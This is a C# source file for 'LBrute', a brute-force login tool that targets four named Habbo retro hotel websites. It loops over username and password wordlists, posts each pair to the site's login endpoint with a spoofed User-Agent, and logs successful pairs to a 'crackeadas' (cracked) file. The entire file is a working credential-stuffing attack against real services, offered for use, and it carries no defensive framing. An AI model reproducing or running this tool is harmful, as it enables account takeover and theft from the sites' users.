using System.Collections.Generic;
using System.IO;
using System.Net.Http;

namespace LBrute
{
    class Brute
    {
        public static int crackeadas, invalidas;
        public static string hotel = "?";
        public static bool executando = true;
        public static string LoginUrl, MeUrl;
        public static Dictionary<string, string> form = new();

        public static void ConfigureHotel(){

            switch (hotel.ToLower()){
                case "habblive":
                    LoginUrl = "https://habblive.in/";
                    MeUrl = "https://habblive.in/me";
                    break;
                case "lella":
                    LoginUrl = "https://lella.ws/api/login";
                    MeUrl = "https://lella.ws/me";
                    break;
                case "habbok":
                    LoginUrl = "https://habbok.me/";
                    MeUrl = "https://habbok.me/me";
                    break;
                case "iron":
                    LoginUrl = "https://ironhotel.biz/callback/bruteLogin";
                    MeUrl = "https://ironhotel.biz/me";
                    break;
            }
        }

        private static async void Checker(string username, string password, Dictionary<string, string> form) 
        {
            using (HttpClient client = new HttpClient()) 
            {
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon)");
                var formurlencodedcontent = new FormUrlEncodedContent(form);
                await client.PostAsync(LoginUrl, formurlencodedcontent);
                string body = await client.GetStringAsync(MeUrl);
                if (body.Contains(username))
                {
                    crackeadas++;
                    File.AppendAllText("crackeadas.txt", $"[{hotel}] - Usuário: {username} - Senha: {password}\n");
                }
                else
                {
                    invalidas++;
                    File.AppendAllText("invalidas.txt", $"[{hotel}] - Usuário: {username} - Senha: {password}\n");
                }

                Menu.UpdateTitle();
            }
        }

        private static void Habblive(string username, string password) 
        {
            var formulario = new Dictionary<string, string>{
                ["username"] = username,
                ["password"] = password
            };
            Checker(username, password, formulario);
        }

        private static void Lella(string username, string password) 
        {
            var formulario = new Dictionary<string, string> { 
                ["type"] = "normal",
                ["username"] = username,
                ["password"] = password
            };
            Checker(username, password, formulario);
        }

        private static void Habbok(string username, string password) 
        {
            var formulario = new Dictionary<string, string> { 
                ["habbinc-login-username"] = username,
                ["habbinc-login-senha"] = password
            };
            Checker(username, password, formulario);
        }

        private static void Iron(string username, string password) 
        {
            var formulario = new Dictionary<string, string> {
                ["username"] = username,
                ["password"] = password,
                ["token"] = ""
            };
            Checker(username, password, formulario);
        }

        private static void InitBrute(string username){
            string hotel_ = hotel.ToLower();

            foreach (var password in File.ReadAllLines("senhas.txt")) 
            {

                if (!executando) return;

                if (hotel_ == "habblive") Habblive(username, password);
                else if (hotel_ == "iron") Iron(username, password);
                else if (hotel_ == "habbok") Habbok(username, password);
                else if (hotel_ == "lella") Lella(username, password);

            }
        }

        public static void Start(){
            foreach(var username in File.ReadAllLines("usuarios.txt")){
                InitBrute(username);
            }
        }

    }
}
